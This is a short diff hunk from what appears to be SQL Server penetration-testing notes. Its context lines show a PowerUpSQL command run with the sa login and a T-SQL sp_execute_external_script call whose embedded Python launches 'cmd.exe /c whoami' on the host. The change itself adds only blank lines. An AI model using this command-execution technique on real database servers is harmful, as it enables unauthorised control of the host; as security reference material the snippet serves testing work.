@@ -17,3 +17,5 @@ Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance "<DBSERVERNA
 EXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen("cmd.exe /c whoami", stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])'
 WITH RESULT SETS (([cmd_out] nvarchar(max)))
 ```
+
+
